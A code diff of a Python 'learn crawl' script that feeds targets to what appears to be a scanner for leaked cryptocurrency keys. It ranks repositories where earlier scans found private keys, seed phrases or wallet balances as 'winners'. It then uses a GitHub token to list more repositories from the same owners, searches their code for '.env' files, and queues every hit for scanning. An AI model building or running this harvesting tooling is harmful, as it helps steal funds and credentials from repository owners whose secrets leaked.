@@ -1,325 +1,389 @@
 #!/usr/bin/env python3
-"""
-learn_crawl.py - Continuous target discovery and feed helper.
+"""Production learn crawl — expand from REAL wins + live GitHub neighbors.
 
-Continuously parses all local data sources and feeds newly discovered
-targets (GitHub URLs/orgs, GCS buckets, IPs, RPC endpoints, platform
-hints) back into ~/paste_box.txt so the next pipeline run scans them.
+No longer re-ingests placeholder target files as "discovery".
+Pipeline:
+  1) Read outcome-scored winners from target_intelligence / scanner memory
+  2) Expand same GitHub org + recent repos (live API)
+  3) Mine trufflehog for real github URLs only (fake-filtered)
+  4) Append LEARNED block to paste_box (deduped, capped, scored)
 """
 from __future__ import annotations
-import json, os, re, sys
+
+import json
+import os
+import re
+import sys
+import time
 from datetime import datetime, timezone
 from pathlib import Path
+from typing import Dict, List, Optional, Set, Tuple
+
+try:
+    import requests
+except ImportError:
+    raise SystemExit("[!] requests required")
 
 HOME = Path.home()
 PASTE_BOX = HOME / "paste_box.txt"
-PASTE_TXT = HOME / "paste.txt"
 LEARN_FILE = HOME / "learn_findings.jsonl"
 TRUFFLEHOG_RESULTS = HOME / ".trufflehog_results.jsonl"
 TRUFFLEHOG_MASS = HOME / ".trufflehog_mass_results.jsonl"
 HIGH_CONFIDENCE = HOME / "high_confidence_hits.jsonl"
-BALANCES_HIT = HOME / "balances_hit.jsonl"
-RPC_ENDPOINTS = HOME / "rpc_endpoints.jsonl"
-CRYPTO_FINDINGS = HOME / "crypto_findings.jsonl"
-PIPELINE_LOG = HOME / "pipeline.log"
-TARGETS_DIR = HOME / "targets"
+MEMORY_FILE = HOME / "crypto_scanner_memory.jsonl"
+OUTCOMES_FILE = HOME / ".scan_outcomes.jsonl"
+HOT_FILE = HOME / ".hot_targets.json"
 
-GITHUB_URL_RE = re.compile(r"https?://github\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)(?:\.git)?[/?#]?")
-GITHUB_ORG_RE = re.compile(r"\bgit@github\.com:([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)")
-GITHUB_BARE_ORG = re.compile(r"\b([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)\s")
-GITHUB_URL_SHORT = re.compile(r"\bgh://([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)")
-GCS_URL_RE = re.compile(r"gs://([A-Za-z0-9_.-]+)")
-GCS_HTTP_RE = re.compile(r"https?://storage\.googleapis\.com/([A-Za-z0-9_.-]+)")
-POSTMAN_RE = re.compile(r"postman://(collection|workspace)/[A-Za-z0-9_.-]+")
-IP_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b")
-RPC_RE = re.compile(r"https?://(?:[\w.-]+)(?::\d+)?(?:/[^\s?#]*)?")
-SKIP_DOMAINS = {"github.com", "google.com", "amazonaws.com", "gitlab.com",
-                "docker.io", "postman.com", "elastic.co", "example.com",
-                "wikipedia.org", "cloudflare.com", "iana.org", "iana-servers.net"}
-
-PLATFORM_HINTS = {
-    "github": re.compile(r"\bgithub\.com\b|\bgithub://|\bgh://", re.IGNORECASE),
-    "gitlab": re.compile(r"\bgitlab\.com\b|\bgitlab://", re.IGNORECASE),
-    "huggingface": re.compile(r"\bhuggingface\.co\b|\bhf\.co\b", re.IGNORECASE),
-    "docker": re.compile(r"\bdocker\.io\b|\bdockerhub\b|\bdocker\.com\b", re.IGNORECASE),
-    "circleci": re.compile(r"\bcircleci\.com\b", re.IGNORECASE),
-    "postman": re.compile(r"\bpostman\.com\b|\bpostman\.co\b", re.IGNORECASE),
-    "aws_s3": re.compile(r"\bs3\.amazonaws\.com\b|\baws\.amazon\.com\b", re.IGNORECASE),
-    "gcs": re.compile(r"\bstorage\.googleapis\.com\b|\bgs://", re.IGNORECASE),
-    "jenkins": re.compile(r"\bjenkins\b", re.IGNORECASE),
-    "elasticsearch": re.compile(r"\belasticsearch\b", re.IGNORECASE),
-    "syslog": re.compile(r"\bsyslog\b", re.IGNORECASE),
-}
-
-BEGIN_GEN_MARKER = "# === BEGIN GENERATED TARGETS ==="
-END_GEN_MARKER = "# === END GENERATED TARGETS ==="
 BEGIN_LEARN_MARKER = "# === BEGIN LEARNED TARGETS ==="
 END_LEARN_MARKER = "# === END LEARNED TARGETS ==="
+BEGIN_GEN_MARKER = "# === BEGIN GENERATED TARGETS ==="
+END_GEN_MARKER = "# === END GENERATED TARGETS ==="
 
-stats = {"sources": 0, "new_urls": 0, "new_orgs": 0, "new_buckets": 0,
-         "new_ips": 0, "new_postman": 0, "new_rpc": 0, "new_hints": {}}
-LEARNED = set()
+MAX_LEARN_APPEND = int(os.environ.get("LEARN_APPEND_CAP", "200"))
 
-def _load_seen():
-    if PASTE_BOX.exists():
-        with PASTE_BOX.open("r", encoding="utf-8", errors="ignore") as fh:
-            txt = fh.read()
-        for m in GITHUB_URL_RE.finditer(txt):
-            LEARNED.add(f"github:{m.group(1)}/{m.group(2)}")
-        for m in GITHUB_ORG_RE.finditer(txt):
-            LEARNED.add(f"github:{m.group(1)}/{m.group(2)}")
-        for m in GITHUB_URL_SHORT.finditer(txt):
-            LEARNED.add(f"github:{m.group(1)}/{m.group(2)}")
-        for m in GCS_URL_RE.finditer(txt):
-            LEARNED.add(f"gcs:{m.group(1)}")
-        for m in IP_RE.finditer(txt):
-            LEARNED.add(f"ip:{m.group(0)}")
+FAKE_RE = re.compile(
+    r"placeholder|example\.com|my-bucket|myuser|myimage|localhost|127\.0\.0\.1|"
+    r"your[-_]|xxx|dummy|public-dataset-placeholder|public-bucket-placeholder|"
+    r"jenkins\.example|es-\d+\.example|logs-\d+\.example",
+    re.I,
+)
+GITHUB_URL_RE = re.compile(
+    r"https?://(?:www\.)?github\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+?)(?:\.git)?(?:[/?#]|$)"
+)
+GIST_RE = re.compile(r"https?://gist\.github\.com/([A-Za-z0-9_.-]+)/([a-f0-9]+)")
+GITLAB_URL_RE = re.compile(
+    r"https?://(?:www\.)?gitlab\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+)"
+)
 
-LEARNED_LINES = set()
+stats = {
+    "sources": 0,
+    "new_urls": 0,
+    "expanded_orgs": 0,
+    "from_outcomes": 0,
+    "from_trufflehog": 0,
+    "from_live": 0,
+    "appended": 0,
+    "dropped_fake": 0,
+}
 
-def _seen(source, line):
-    k = f"{source}:{line.strip()[:100]}"
-    return k in LEARNED_LINES
 
-def _mark(source, line):
-    LEARNED_LINES.add(f"{source}:{line.strip()[:100]}")
+def utc_now() -> str:
+    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
 
-def _extract_urls(text, source):
-    new = []
+
+def is_fake(uri: str) -> bool:
+    if not uri or not str(uri).strip() or str(uri).strip().startswith("#"):
+        return True
+    return bool(FAKE_RE.search(str(uri)))
+
+
+def load_token() -> str:
+    env = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN") or ""
+    if env.strip():
+        return env.strip()
+    p = HOME / ".github_token"
+    if p.exists():
+        return p.read_text(encoding="utf-8", errors="ignore").strip().splitlines()[0].strip()
+    return ""
+
+
+def norm_gh(owner: str, repo: str) -> Optional[str]:
+    owner = (owner or "").strip()
+    repo = (repo or "").strip().removesuffix(".git")
+    if not owner or not repo:
+        return None
+    if owner.lower() in {"about", "settings", "marketplace", "search", "topics", "orgs"}:
+        return None
+    u = f"https://github.com/{owner}/{repo}"
+    return None if is_fake(u) else u
+
+
+def extract_urls(text: str) -> List[str]:
+    out = []
+    if not text:
+        return out
     for m in GITHUB_URL_RE.finditer(text):
-        url = f"https://github.com/{m.group(1)}/{m.group(2)}"
-        k = f"github:{m.group(1)}/{m.group(2)}"
-        if k not in LEARNED:
-            LEARNED.add(k); new.append(url); _mark(source, url); stats["new_urls"] += 1
-    for m in GITHUB_ORG_RE.finditer(text):
-        org = f"{m.group(1)}/{m.group(2)}"
-        k = f"github:{m.group(1)}/{m.group(2)}"
-        if k not in LEARNED:
-            LEARNED.add(k); new.append(org); _mark(source, org); stats["new_orgs"] += 1
-    for m in GITHUB_BARE_ORG_RE.finditer(text):
-        org = f"{m.group(1)}/{m.group(2)}"
-        if org.lower() in {"git","root","admin","user","test","src","lib","bin"}:
+        u = norm_gh(m.group(1), m.group(2))
+        if u:
+            out.append(u)
+    for m in GIST_RE.finditer(text):
+        u = m.group(0).split("#")[0]
+        if not is_fake(u):
+            out.append(u)
+    for m in GITLAB_URL_RE.finditer(text):
+        u = f"https://gitlab.com/{m.group(1)}/{m.group(2).removesuffix('.git')}"
+        if not is_fake(u):
+            out.append(u)
+    return out
+
+
+def load_existing_paste_uris() -> Set[str]:
+    seen: Set[str] = set()
+    if not PASTE_BOX.exists():
+        return seen
+    for ln in PASTE_BOX.read_text(encoding="utf-8", errors="ignore").splitlines():
+        s = ln.strip()
+        if not s or s.startswith("#"):
             continue
-        k = f"github:{org}"
-        if k not in LEARNED:
-            LEARNED.add(k); new.append(org); _mark(source, org); stats["new_orgs"] += 1
-    for m in GITHUB_URL_SHORT.finditer(text):
-        url = f"https://github.com/{m.group(1)}/{m.group(2)}"
-        k = f"github:{m.group(1)}/{m.group(2)}"
-        if k not in LEARNED:
-            LEARNED.add(k); new.append(url); _mark(source, url); stats["new_urls"] += 1
-    return new
-
-def _extract_gcs(text, source):
-    new = []
-    for m in GCS_URL_RE.finditer(text):
-        k = f"gcs:{m.group(1)}"
-        if k not in LEARNED:
-            LEARNED.add(k); new.append(f"gs://{m.group(1)}"); _mark(source, m.group(1)); stats["new_buckets"] += 1
-    for m in GCS_HTTP_RE.finditer(text):
-        k = f"gcs:{m.group(1)}"
-        if k not in LEARNED:
-            LEARNED.add(k); new.append(f"https://storage.googleapis.com/{m.group(1)}"); _mark(source, m.group(1)); stats["new_buckets"] += 1
-    return new
-
-def _extract_ips(text, source):
-    new = []
-    for m in IP_RE.finditer(text):
-        k = f"ip:{m.group(0)}"
-        if k not in LEARNED:
-            LEARNED.add(k); new.append(m.group(0)); _mark(source, m.group(0)); stats["new_ips"] += 1
-    return new
-
-def _extract_rpc(text, source):
-    new = []
-    for m in RPC_RE.finditer(text):
-        url = m.group(0)
-        dom = url.split("/")[2].split(":")[0].lower() if "://" in url else ""
-        if dom in SKIP_DOMAINS or dom.endswith((".gov", ".edu", ".org")):
+        if is_fake(s):
+            stats["dropped_fake"] += 1
             continue
-        if url not in LEARNED:
-            LEARNED.add(url); new.append(url); _mark(source, url); stats["new_rpc"] += 1
-    return new
+        seen.add(s.rstrip("/"))
+        for u in extract_urls(s):
+            seen.add(u)
+    return seen
 
-def _extract_postman(text, source):
-    new = []
-    for m in POSTMAN_RE.finditer(text):
-        url = f"postman://{m.group(1)}"
-        if url not in LEARNED:
-            LEARNED.add(url); new.append(url); _mark(source, url); stats["new_postman"] += 1
-    return new
 
-def _hints(text):
-    h = {}
-    for p, pat in PLATFORM_HINTS.items():
-        c = len(pat.findall(text))
-        if c: h[p] = h.get(p, 0) + c
-    return h
+def winners_from_outcomes() -> Tuple[List[str], Set[str]]:
+    """Return (uris_to_boost, orgs_to_expand)."""
+    uris: List[str] = []
+    orgs: Set[str] = set()
+    # outcomes log
+    if OUTCOMES_FILE.exists():
+        for line in OUTCOMES_FILE.read_text(encoding="utf-8", errors="ignore").splitlines()[-2000:]:
+            try:
+                rec = json.loads(line)
+            except Exception:
+                continue
+            if rec.get("has_key") or rec.get("has_balance"):
+                uri = rec.get("uri") or ""
+                if uri and not is_fake(uri):
+                    uris.append(uri)
+                    m = GITHUB_URL_RE.search(uri)
+                    if m:
+                        orgs.add(m.group(1))
+                        stats["from_outcomes"] += 1
+    # memory / high conf
+    for path in (MEMORY_FILE, HIGH_CONFIDENCE):
+        if not path.exists():
+            continue
+        try:
+            data = path.read_bytes()
+            if len(data) > 4_000_000:
+                data = data[-4_000_000:]
+            for line in data.decode("utf-8", errors="ignore").splitlines()[-3000:]:
+                try:
+                    rec = json.loads(line)
+                except Exception:
+                    continue
+                findings = rec.get("findings") or {}
+                wallet = findings.get("wallet") or {}
+                has_key = bool(
+                    wallet.get("wifs") or wallet.get("hex_keys") or wallet.get("seed_phrases")
+                    or findings.get("wif") or findings.get("hex_key") or findings.get("seed_phrase")
+                )
+                if not has_key:
+                    continue
+                src = rec.get("source_uri") or rec.get("source") or ""
+                for u in extract_urls(str(src)) + extract_urls(str(rec.get("source_line") or "")):
+                    uris.append(u)
+                    m = GITHUB_URL_RE.search(u)
+                    if m:
+                        orgs.add(m.group(1))
+                if src and str(src).startswith("http") and not is_fake(str(src)):
+                    uris.append(str(src).split("#")[0])
+        except Exception:
+            continue
+    return uris, orgs
 
-def _process_file(path, source):
-    r = {"github_urls": [], "github_orgs": [], "gcs_buckets": [], "ips": [], "postman": [], "rpc_endpoints": [], "hints": {}}
-    if not path.exists(): return r
-    with path.open("r", encoding="utf-8", errors="ignore") as fh:
-        for line in fh:
-            line = line.strip()
-            if not line or _seen(source, line): continue
-            _mark(source, line)
-            r["github_urls"].extend(_extract_urls(line, source))
-            r["github_orgs"].extend(_extract_urls(line, source))
-            r["gcs_buckets"].extend(_extract_gcs(line, source))
-            r["ips"].extend(_extract_ips(line, source))
-            r["rpc_endpoints"].extend(_extract_rpc(line, source))
-            r["postman"].extend(_extract_postman(line, source))
-            for p, c in _hints(line).items():
-                r["hints"][p] = r["hints"].get(p, 0) + c
-    stats["sources"] += 1
-    return r
 
-def _process_text(text, source):
-    r = {"github_urls": [], "github_orgs": [], "gcs_buckets": [], "ips": [], "postman": [], "rpc_endpoints": [], "hints": {}}
-    for line in text.splitlines():
-        line = line.strip()
-        if not line or _seen(source, line): continue
-        _mark(source, line)
-        r["github_urls"].extend(_extract_urls(line, source))
-        r["gcs_buckets"].extend(_extract_gcs(line, source))
-        r["ips"].extend(_extract_ips(line, source))
-        r["rpc_endpoints"].extend(_extract_rpc(line, source))
-        for p, c in _hints(line).items():
-            r["hints"][p] = r["hints"].get(p, 0) + c
-    stats["sources"] += 1
-    return r
+def mine_trufflehog_urls(limit_lines: int = 4000) -> List[str]:
+    found: List[str] = []
+    for path in (TRUFFLEHOG_RESULTS, TRUFFLEHOG_MASS, HIGH_CONFIDENCE):
+        if not path.exists():
+            continue
+        stats["sources"] += 1
+        try:
+            data = path.read_bytes()
+            if len(data) > 6_000_000:
+                data = data[-6_000_000:]
+            lines = data.decode("utf-8", errors="ignore").splitlines()[-limit_lines:]
+        except Exception:
+            continue
+        for line in lines:
+            try:
+                rec = json.loads(line)
+                blob = json.dumps(rec)[:5000]
+            except Exception:
+                blob = line[:2000]
+            for u in extract_urls(blob):
+                found.append(u)
+                stats["from_trufflehog"] += 1
+    return found
 
-def process_all():
-    all_f = {"github_urls": set(), "github_orgs": set(), "gcs_buckets": set(),
-             "ips": set(), "postman": set(), "rpc_endpoints": set(), "hints": {}}
 
-    print("  [learn] Processing trufflehog results...")
-    r = _process_file(TRUFFLEHOG_RESULTS, "trufflehog")
-    for k in ("github_urls","github_orgs","gcs_buckets","ips","postman","rpc_endpoints"):
-        all_f[k].update(r.get(k,[]))
-    for p,c in r.get("hints",{}).items(): all_f["hints"][p]=all_f["hints"].get(p,0)+c
+def gh_get(url: str, token: str, params: Optional[dict] = None):
+    headers = {
+        "Accept": "application/vnd.github+json",
+        "User-Agent": "RepoHere1-LearnCrawl/3.0",
+        "X-GitHub-Api-Version": "2022-11-28",
+    }
+    if token:
+        headers["Authorization"] = f"Bearer {token}"
+    try:
+        r = requests.get(url, headers=headers, params=params or {}, timeout=20)
+        if r.status_code != 200:
+            return None
+        return r.json()
+    except Exception:
+        return None
 
-    print("  [learn] Processing high-confidence hits...")
-    r = _process_file(HIGH_CONFIDENCE, "highconf")
-    for k in ("github_urls","ips","rpc_endpoints"):
-        all_f[k].update(r.get(k,[]))
-    for p,c in r.get("hints",{}).items(): all_f["hints"][p]=all_f["hints"].get(p,0)+c
 
-    print("  [learn] Processing pipeline log...")
-    r = _process_file(PIPELINE_LOG, "pipeline")
-    for k in ("github_urls","github_orgs","ips","rpc_endpoints"):
-        all_f[k].update(r.get(k,[]))
-    for p,c in r.get("hints",{}).items(): all_f["hints"][p]=all_f["hints"].get(p,0)+c
+def expand_orgs_live(orgs: Set[str], token: str, per_org: int = 12) -> List[str]:
+    out: List[str] = []
+    if not token:
+        print("  [!] No GITHUB_TOKEN — cannot live-expand orgs")
+        return out
+    for org in sorted(orgs)[:20]:
+        print(f"  [live] expand org {org}")
+        data = gh_get(
+            f"https://api.github.com/users/{org}/repos",
+            token,
+            params={"sort": "pushed", "per_page": per_org, "type": "all"},
+        )
+        if not isinstance(data, list):
+            # try org endpoint
+            data = gh_get(
+                f"https://api.github.com/orgs/{org}/repos",
+                token,
+                params={"sort": "pushed", "per_page": per_org, "type": "all"},
+            )
+        if isinstance(data, list):
+            stats["expanded_orgs"] += 1
+            for repo in data:
+                html = repo.get("html_url") or ""
+                if html and not is_fake(html):
+                    out.append(html)
+                    stats["from_live"] += 1
+        time.sleep(0.8)
+    return out
 
-    print("  [learn] Processing balance hits...")
-    r = _process_file(BALANCES_HIT, "balances")
-    for k in ("ips","rpc_endpoints"):
-        all_f[k].update(r.get(k,[]))
-    for p,c in r.get("hints",{}).items(): all_f["hints"][p]=all_f["hints"].get(p,0)+c
 
-    print("  [learn] Processing RPC endpoints...")
-    r = _process_file(RPC_ENDPOINTS, "rpc")
-    for k in ("rpc_endpoints","ips"):
-        all_f[k].update(r.get(k,[]))
-    for p,c in r.get("hints",{}).items(): all_f["hints"][p]=all_f["hints"].get(p,0)+c
+def live_neighbor_search(token: str, orgs: Set[str]) -> List[str]:
+    """Search code in winning orgs for env/wallet files."""
+    out: List[str] = []
+    if not token or not orgs:
+        return out
+    for org in sorted(orgs)[:8]:
+        q = f"org:{org} filename:.env"
+        print(f"  [live] code search {q}")
+        data = gh_get(
+            "https://api.github.com/search/code",
+            token,
+            params={"q": q, "per_page": 15},
+        )
+        if not data:
+            time.sleep(2)
+            continue
+        for it in data.get("items") or []:
+            repo = it.get("repository") or {}
+            html = repo.get("html_url") or ""
+            if html and not is_fake(html):
+                out.append(html)
+                stats["from_live"] += 1
+        time.sleep(2)
+    return out
 
-    print("  [learn] Processing targets directory...")
-    if TARGETS_DIR.exists():
-        for tf in sorted(TARGETS_DIR.iterdir()):
-            if tf.is_file():
-                r = _process_file(tf, f"targets/{tf.name}")
-                for k in ("github_urls","github_orgs","gcs_buckets","ips"):
-                    all_f[k].update(r.get(k,[]))
-                for p,c in r.get("hints",{}).items(): all_f["hints"][p]=all_f["hints"].get(p,0)+c
 
-    if PASTE_TXT.exists():
-        with PASTE_TXT.open("r", encoding="utf-8", errors="ignore") as fh:
-            r = _process_text(fh.read(), "paste_txt")
-        all_f["github_urls"].update(r.get("github_urls",set()))
-        all_f["github_orgs"].update(r.get("github_orgs",set()))
+def append_learned(new_uris: List[str], existing: Set[str]) -> int:
+    filtered = []
+    seen = set(existing)
+    for u in new_uris:
+        u = u.strip().rstrip("/")
+        if not u or is_fake(u) or u in seen:
+            if u and is_fake(u):
+                stats["dropped_fake"] += 1
+            continue
+        seen.add(u)
+        filtered.append(u)
+        if len(filtered) >= MAX_LEARN_APPEND:
+            break
+    if not filtered:
+        return 0
 
-    return all_f
+    paste = PASTE_BOX.read_text(encoding="utf-8", errors="ignore") if PASTE_BOX.exists() else ""
 
-def append_to_paste(new_items):
-    if not new_items: return 0
-    paste = ""
-    if PASTE_BOX.exists():
-        with PASTE_BOX.open("r", encoding="utf-8", errors="ignore") as fh:
-            paste = fh.read()
+    # Remove old LEARNED block if present
+    if BEGIN_LEARN_MARKER in paste and END_LEARN_MARKER in paste:
+        pre = paste.split(BEGIN_LEARN_MARKER)[0]
+        post = paste.split(END_LEARN_MARKER, 1)[1]
+        # drop leading newlines of post
+        paste = pre.rstrip() + "\n" + post.lstrip("\n")
 
-    # Find insert point: after END_GENERATED or END_LEARNED marker
-    pos = len(paste)
-    for marker in [END_GEN_MARKER, END_LEARN_MARKER]:
-        if marker in paste:
-            p = paste.index(marker) + len(marker)
-            while p < len(paste) and paste[p] in ("\n","\r"): p += 1
-            pos = min(pos, p)
+    block_lines = [
+        BEGIN_LEARN_MARKER,
+        f"# learn crawl LIVE @ {utc_now()} — winners + org expansion — fakes purged",
+        f"# {len(filtered)} new targets",
+    ]
+    block_lines.extend(filtered)
+    block_lines.append(END_LEARN_MARKER)
 
-    # Read existing content after insert point
-    after = paste[pos:] if pos < len(paste) else ""
-    existing = set(after.splitlines())
+    # Insert after GENERATED block if present, else append
+    if END_GEN_MARKER in paste:
+        parts = paste.split(END_GEN_MARKER, 1)
+        new_text = parts[0] + END_GEN_MARKER + "\n\n" + "\n".join(block_lines) + "\n" + parts[1].lstrip("\n")
+    else:
+        new_text = paste.rstrip() + "\n\n" + "\n".join(block_lines) + "\n"
 
-    # Deduplicate against content after markers
-    filtered = [i for i in new_items if i.strip() and i.strip() not in existing]
-
-    if not filtered: return 0
-
-    block = [f"# Learn crawl: {datetime.now(timezone.utc).isoformat().replace('+00:00','Z')}"]
-    for item in filtered:
-        block.append(item)
-    block.append(f"# --- end learn batch ({len(filtered)} items) ---")
-    block.append(END_LEARN_MARKER)
-
-    # Build new text: before pos + new block + existing after content
-    new_text = paste[:pos] + "\n".join(block) + "\n" + after
-
-    with PASTE_BOX.open("w", encoding="utf-8") as fh:
-        fh.write(new_text)
+    PASTE_BOX.write_text(new_text, encoding="utf-8")
+    stats["appended"] = len(filtered)
+    stats["new_urls"] = len(filtered)
     return len(filtered)
 
-def append_record(findings):
-    record = {
-        "ts": datetime.now(timezone.utc).isoformat().replace("+00:00","Z"),
-        "new_github_urls": len(findings.get("github_urls",[])),
-        "new_github_orgs": len(findings.get("github_orgs",[])),
-        "new_gcs_buckets": len(findings.get("gcs_buckets",[])),
-        "new_ips": len(findings.get("ips",[])),
-        "new_postman": len(findings.get("postman",[])),
-        "new_rpc": len(findings.get("rpc_endpoints",[])),
-        "hints": findings.get("hints",{}),
+
+def main() -> int:
+    print("[+] Learn crawl (production — winners + live expand)")
+    token = load_token()
+    existing = load_existing_paste_uris()
+    print(f"  existing real paste uris: {len(existing)}")
+
+    boost_uris, orgs = winners_from_outcomes()
+    print(f"  outcome winners: {len(set(boost_uris))} uris, {len(orgs)} orgs")
+
+    mined = mine_trufflehog_urls()
+    print(f"  mined from findings: {len(set(mined))} uris")
+
+    live_org = expand_orgs_live(orgs, token)
+    live_search = live_neighbor_search(token, orgs)
+    print(f"  live expand: {len(set(live_org) | set(live_search))} uris")
+
+    # Priority order: outcome boost → live org → live search → mined
+    ordered: List[str] = []
+    for batch in (boost_uris, live_org, live_search, mined):
+        for u in batch:
+            ordered.append(u)
+
+    # Prefer unscanned
+    new_only = [u for u in ordered if u.rstrip("/") not in existing]
+
+    appended = append_learned(new_only, existing)
+
+    # Wire intelligence reorder if available
+    try:
+        sys.path.insert(0, str(HOME))
+        from target_intelligence import TargetIntelligence
+        ti = TargetIntelligence()
+        n = ti.reorder_paste_box()
+        print(f"  intelligence reorder: {n} targets")
+        # record that learn ran (no fake success)
+    except Exception as e:
+        print(f"  [!] intelligence reorder skipped: {e}")
+
+    rec = {
+        "ts": utc_now(),
+        "stats": stats,
+        "orgs_expanded": sorted(orgs)[:50],
+        "appended": appended,
     }
-    with LEARN_FILE.open("a", encoding="utf-8") as fh:
-        fh.write(json.dumps(record) + "\n")
+    with LEARN_FILE.open("a", encoding="utf-8") as f:
+        f.write(json.dumps(rec) + "\n")
 
-def main():
-    print("[+] Learn crawl: continuous target discovery...")
-    _load_seen()
-    all_f = process_all()
-
-    new_items = []
-    new_items.extend(sorted(all_f.get("github_urls",set())))
-    new_items.extend(sorted(all_f.get("github_orgs",set())))
-    new_items.extend(sorted(all_f.get("gcs_buckets",set())))
-    new_items.extend(sorted(all_f.get("ips",set())))
-    new_items.extend(sorted(all_f.get("postman",set())))
-    new_items.extend(sorted(all_f.get("rpc_endpoints",set())))
-
-    appended = append_to_paste(new_items)
-
-    print(f"\n[+] Learn crawl complete")
-    print(f"    Sources parsed:    {stats['sources']}")
-    print(f"    New GitHub URLs:   {stats['new_urls']}")
-    print(f"    New GitHub orgs:   {stats['new_orgs']}")
-    print(f"    New GCS buckets:   {stats['new_buckets']}")
-    print(f"    New IPs:           {stats['new_ips']}")
-    print(f"    New RPC endpoints: {stats['new_rpc']}")
-    print(f"    New Postman:       {stats['new_postman']}")
-    print(f"    Targets appended:  {appended}")
-    print(f"    Output:            {LEARN_FILE}")
-
-    append_record(all_f)
+    print("\n[+] Learn crawl complete")
+    for k, v in stats.items():
+        print(f"    {k}: {v}")
+    print(f"    Output: {LEARN_FILE}")
     return 0
+
 
 if __name__ == "__main__":
     sys.exit(main())
